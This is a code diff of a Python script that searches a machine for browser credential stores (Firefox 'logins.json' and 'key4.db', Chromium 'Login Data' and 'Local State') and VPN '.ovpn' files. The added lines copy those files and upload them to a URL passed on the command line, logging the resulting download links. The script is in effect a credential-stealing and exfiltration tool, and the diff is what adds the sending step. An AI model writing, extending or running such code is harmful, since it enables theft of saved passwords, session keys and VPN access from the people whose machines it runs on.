@@ -7,11 +7,16 @@ from helpers import utils, find_files, csv_manager, filemanager
 
 def main(url):
     system_information = utils.system_information()
-    csv_writer = csv_manager.init()
+    csv_manager.init()
     search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State']
     search_files_regex = '|'.join([re.escape(file) for file in search_files])
     files = filemanager.search_files(search_files_regex)
-    csv_manager.add_rows(files)
+    filenames = filemanager.copy_files(files)
+    csv_manager.add_rows(filenames)
+    # url is not None AND url is not empty or blank
+    if url and url.strip():
+        dl_links = filemanager.send_files(url)
+        csv_manager.update_dl_link(dl_links)
 
 
 if __name__ == '__main__':
@@ -22,7 +27,6 @@ if __name__ == '__main__':
     parser.add_argument('--url', dest='url', help='url parameter for http server')
 
     args = parser.parse_args()
-    print()
     main(args.url)
 
     end_time = datetime.datetime.now()
